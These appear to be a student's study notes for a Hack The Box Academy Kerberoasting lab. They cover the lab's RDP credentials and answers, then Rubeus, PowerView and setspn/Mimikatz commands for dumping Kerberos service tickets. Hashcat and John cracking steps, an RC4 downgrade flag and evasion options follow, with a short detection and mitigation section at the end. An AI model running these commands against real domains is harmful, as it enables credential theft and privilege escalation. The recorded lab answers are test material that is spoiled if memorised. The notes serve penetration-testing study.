# Section 18 — Kerberoasting from Windows

---

## Lab Attack Chain (ACADEMY-EA-MS01 / INLANEFREIGHT.LOCAL)

**RDP in:** `xfreerdp /v:10.129.94.166 /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution`

```powershell
# 1. Navigate to tools
cd C:\Tools

# 2. Request ticket for svc_vmwaresso (vmware/inlanefreight.local SPN)
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
# Output: $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@...
```
> `/user:` targets a single account. `/nowrap` keeps the hash on one line so you can copy-paste it directly into Hashcat without it breaking across multiple lines.

```bash
# 3. On Linux — save hash with SINGLE QUOTES (double quotes break $ expansion)
echo '$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$...' > vmware_tgs

# 4. Crack with John (Hashcat OpenCL broken on this VM)
john vmware_tgs --wordlist=/usr/share/wordlists/rockyou.txt
# Result: Virtual01
```
> Always use single quotes when saving hashes to a file. Double quotes cause the shell to expand `$` as a variable, which corrupts the hash. John auto-detects the Kerberos TGS format.

**Lab answers:**
- Q1 — SPN `vmware/inlanefreight.local` account: `svc_vmwaresso`
- Q2 — Password: `Virtual01`

**Shell quoting lesson learned:** Always use single quotes when echoing hashes to file. Double quotes cause zsh/bash to interpret `$` as variable expansion → empty or mangled file.

---

## QUICK REFERENCE — Three Methods

### Method 1 — Rubeus (Fastest, Recommended)
```powershell
cd C:\Tools

# Stats only (no tickets requested)
.\Rubeus.exe kerberoast /stats

# High-value targets only (admincount=1)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# All tickets
.\Rubeus.exe kerberoast /nowrap

# Single user
.\Rubeus.exe kerberoast /user:SAPService /nowrap

# Force RC4 (downgrade from AES — not on Server 2019)
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
.\Rubeus.exe kerberoast /rc4opsec /nowrap    # filters out AES-only accounts
```
> `/stats` shows available accounts without requesting any tickets — always start here. `/ldapfilter:'admincount=1'` limits targeting to protected admin accounts, which are the highest value. `/tgtdeleg` forces RC4 encryption instead of AES — RC4 cracks much faster. `/rc4opsec` skips accounts that only support AES (requesting RC4 from those would generate a noisy error). `/nowrap` is always required for copy-paste.

### Method 2 — PowerView (Clean Hashcat-ready output)
```powershell
Import-Module .\PowerView.ps1

# List SPN accounts
Get-DomainUser * -spn | select samaccountname

# Single user ticket
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# All tickets → CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv
```
> `Get-DomainUser * -spn` lists all accounts with an SPN. `Get-DomainSPNTicket -Format Hashcat` requests the ticket and formats it for Hashcat automatically. `Export-Csv` saves all tickets to a file for bulk cracking. `-NoTypeInformation` removes the header line that would break Hashcat.

### Method 3 — Semi-Manual (setspn + Mimikatz)
```powershell
# Enumerate SPNs
setspn.exe -Q */*

# Request ticket into memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Extract with Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
> `setspn.exe -Q */*` is a built-in Windows tool that lists all SPNs in the domain. `KerberosRequestorSecurityToken` forces Windows to request and cache a Kerberos ticket in memory. Mimikatz then extracts it. `base64 /out:true` encodes the output as base64 to avoid writing raw binary to disk.

---

## Cracking

```bash
# RC4 (type 23) — most common, fast
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AES-256 (type 18) — slower, ~23 min vs 4 sec on CPU
hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt

# John fallback
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
> Check the hash prefix to determine the mode: `$krb5tgs$23$` = RC4 = mode `13100`. `$krb5tgs$18$` = AES-256 = mode `19700`. RC4 is roughly 350 times faster to crack than AES-256 on a CPU. John auto-detects both formats.

---

## Encryption Type Reference

| msDS-SupportedEncryptionTypes | Value | Meaning |
|-------------------------------|-------|---------|
| 0 | Default | RC4_HMAC_MD5 (etype 23) |
| 8 | AES-128 only | |
| 16 | AES-256 only | |
| 24 | AES-128 + AES-256 | Harder to crack |

```powershell
# Check encryption type for an account
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
> `msds-supportedencryptiontypes` tells you what encryption the account supports. Value `0` defaults to RC4. Value `24` means AES-128 and AES-256 only. Check this before requesting a ticket so you know what cracking speed to expect.

**Hash prefix tells you what you have:**
- `$krb5tgs$23$*` = RC4 → Hashcat mode 13100 → fast
- `$krb5tgs$18$*` = AES-256 → Hashcat mode 19700 → slow

---

## RC4 Downgrade (/tgtdeleg)

```powershell
.\Rubeus.exe kerberoast /user:TARGET /tgtdeleg /nowrap
# Forces RC4 ticket even if account supports AES
# Does NOT work against Windows Server 2019 DCs — will return AES regardless
```
> `/tgtdeleg` uses a delegation technique to request an RC4-encrypted ticket even when the account supports AES. This is a huge speed advantage — RC4 cracks in seconds, AES can take minutes. Does not work on Server 2019 Domain Controllers.

**Speed difference:** RC4 cracks in ~4 sec on CPU | AES-256 takes ~23 min on CPU

---

## Rubeus Key Flags

| Flag | Effect |
|------|--------|
| `/stats` | Show stats only — no ticket requests |
| `/nowrap` | No line wrapping — copy-paste friendly for Hashcat |
| `/ldapfilter:'admincount=1'` | Target only high-value accounts |
| `/user:TARGET` | Single account |
| `/tgtdeleg` | Force RC4 downgrade (not on Server 2019) |
| `/rc4opsec` | Filter out AES-only accounts, request RC4 only |
| `/outfile:hashes.txt` | Save to file |
| `/delay:5000 /jitter:30` | Slow down requests (evasion) |

---

## Semi-Manual Method — Full Chain

```powershell
# 1. Enumerate SPNs with setspn
setspn.exe -Q */*
# Focus on CN=<user accounts>, ignore computer accounts

# 2. Request ticket into memory (single SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# 3. Request all tickets at once
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
> Step 1 uses the built-in `setspn.exe` — no tool needed. Step 2 loads a .NET class and creates a Kerberos token object, which forces Windows to cache the ticket in memory. Step 3 chains the enumeration and ticket request in one pipeline — it extracts the SPN string from `setspn` output and requests a ticket for each one.

```
# 4. Extract from memory with Mimikatz (base64 to avoid file write)
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

# 5. On Linux — clean up base64 and convert
echo "<base64 blob>" | tr -d \\n > encoded_file
cat encoded_file | base64 -d > sqldev.kirbi

# 6. Convert .kirbi to hashcat format
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# 7. Crack
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
> `base64 /out:true` in Mimikatz makes it output binary data as base64, which is safe to copy from a terminal. `tr -d \\n` removes newlines from the base64 blob before decoding. `.kirbi` files are the raw Kerberos ticket format. `kirbi2john.py` converts them to a Hashcat-compatible format. The `sed` command reformats the John output to match Hashcat mode `13100`.

**Shortcut:** Run `mimikatz # kerberos::list /export` without base64 → writes .kirbi files to disk → run kirbi2john directly, skip the base64 steps.

---

## Detection & Mitigation

**Detection:**
| Event ID | Meaning |
|----------|---------|
| 4769 | Kerberos service ticket requested |
| 4770 | Kerberos service ticket renewed |

Many 4769s from one account in a short window = Kerberoasting indicator. Ticket encryption type `0x17` (hex 23) = RC4 requested = likely attack.

**Mitigations:**
- Use **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)** — auto-rotate complex passwords
- Long passphrases on any SPN account that can't use MSA/gMSA
- Never put SPN accounts in Domain Admins
- Restrict RC4 (test carefully — can break things)
- Monitor Event ID 4769 for spikes

---

## Exam Notes

- Rubeus `/ldapfilter:'admincount=1'` = target DA-adjacent accounts first
- `/nowrap` always — makes hash copy-paste ready for Hashcat
- `/tgtdeleg` forces RC4 downgrade (huge speed gain) — doesn't work on Server 2019
- RC4 cracks in seconds; AES-256 takes minutes on CPU, much longer on strong passwords
- PowerView `Export-Csv` = cleanest method for bulk offline processing
- Semi-manual method useful when Rubeus is blocked — uses native PS + Mimikatz
- `msDS-SupportedEncryptionTypes = 0` = RC4 default | `24` = AES only
- Check `/stats` first to understand the target landscape before requesting tickets
- Tool location: `C:\Tools\`
